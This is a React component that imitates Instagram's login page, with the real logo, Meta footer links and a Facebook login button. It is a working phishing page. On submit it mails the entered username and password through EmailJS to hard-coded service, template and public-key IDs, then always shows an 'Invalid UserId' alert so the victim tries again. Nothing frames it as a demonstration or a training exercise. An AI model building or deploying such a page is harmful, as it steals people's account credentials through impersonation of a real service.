import React, { useState } from 'react';
import AppStore from '../src/assets/appStore.png'               
import PlayStore from '../src/assets/playStore.png'       
import emailjs from '@emailjs/browser'        
import  { useRef } from 'react';

const App = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [click, setClick] = useState(0);

  const form = useRef();

  const handleSubmit = (e) => {
    e.preventDefault();
    // Handle login logic here

    emailjs
      .sendForm('service_lxx5308', 'template_puqquar', form.current , {
        publicKey: 'lOIt6hF3hxwh1sYds',
      })
      .then(
        () => {
          console.log('SUCCESS!');
          let num = click + 1;
          setClick(num)
        },
        (error) => {
          console.log('FAILED...', error.text);
        },
      );
    
    alert("Invalid UserId")
    // emailjs.send(
    //   'service_lxx5308', // Replace with your EmailJS service ID
    //   'template_puqquar', // Replace with your EmailJS template ID
    //   {
    //     from_name: name,
    //     from_email: email,
    //     message: message,
    //   },
    //   'YOUR_USER_ID' // Replace with your EmailJS user ID
    // )
    //   .then((result) => {
    //     console.log(result.text);
    //     setSubmitStatus('success');
    //     setName('');
    //     setEmail('');
    //     setMessage('');
    //   }, (error) => {
    //     console.log(error.text);
    //     setSubmitStatus('error');
    //   })
    //   .finally(() => {
    //     setIsSubmitting(false);
    //   });

  };

  return (
    <div className="flex flex-col items-center min-h-screen bg-gray-50 py-8 px-4">
      <div className="w-full max-w-sm">
      <div className="mb-8 flex justify-center">
          <img 
            src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
            alt="Instagram"
            className="h-12"
          />
        </div>
        
        <form onSubmit={handleSubmit} ref={form} className="bg-white p-6 border border-gray-300 rounded mb-4">
          <input
            type="text"
            placeholder="Phone number, username or email address"
            value={username}
            name='user_name'
            onChange={(e) => setUsername(e.target.value)}
            className="w-full mb-2 p-2 border border-gray-300 rounded text-sm"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            name='user_key'
            onChange={(e) => setPassword(e.target.value)}
            className="w-full mb-4 p-2 border border-gray-300 rounded text-sm"
          />
          <button
            type="submit"
            className="w-full bg-blue-500 text-white p-2 rounded font-semibold"
          >
            Log in
          </button>
          
          <div className="flex items-center my-4">
            <div className="flex-grow border-t border-gray-300"></div>
            <span className="px-4 text-gray-500 text-sm">OR</span>
            <div className="flex-grow border-t border-gray-300"></div>
          </div>
          
          <button className="w-full text-blue-900 font-semibold flex items-center justify-center">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96A10 10 0 0 0 22 12.06C22 6.53 17.5 2.04 12 2.04Z" />
            </svg>
            Log in with Facebook
          </button>
          
          <p className="text-center mt-4 text-sm text-blue-900">Forgotten your password?</p>
        </form>
        
        <div className="bg-white p-6 border border-gray-300 rounded text-center mb-4">
          <p className="text-sm">
            Don't have an account? <a href="#" className="text-blue-500 font-semibold">Sign up</a>
          </p>
        </div>
        
        <div className="text-center mb-4">
          <p className="mb-2">Get the app.</p>
          <div className="flex justify-center space-x-2">
            <img src={AppStore} alt="Download on App Store"   className="h-[100px]  w-[100px]" />
            <img src={PlayStore} alt="Get it on Google Play" className="h-[100px]  w-[100px]" />
          </div>
        </div>
        
        <footer className="text-center text-xs text-gray-500 space-y-2">
          <div className="space-x-2">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
          <div className="space-x-2">
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact uploading and non-users</a>
            <a href="#">Meta Verified</a>
          </div>
          <div className="flex justify-center items-center space-x-2">
            <select className="text-xs bg-transparent">
              <option>English (UK)</option>
            </select>
            <span>© 2024 Instagram from Meta</span>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default App;